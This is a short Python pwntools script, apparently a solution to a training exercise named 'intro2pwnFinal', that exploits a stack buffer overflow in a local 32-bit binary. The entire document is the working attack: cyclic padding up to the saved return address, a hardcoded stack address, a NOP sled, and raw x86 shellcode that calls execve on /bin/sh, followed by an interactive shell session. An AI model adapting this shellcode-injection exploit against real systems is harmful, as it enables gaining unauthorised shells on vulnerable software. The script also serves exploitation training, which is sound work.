from pwn import *

proc = process('./intro2pwnFinal')
proc.recvline()

padding = cyclic(cyclic_find('taaa'))
ret = p32(0xffffd4e0+200)
nop_sled = "\x90"*1000

execu = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"

payload = padding + ret + nop_sled + execu
#print(payload)
proc.send(payload)
proc.interactive()

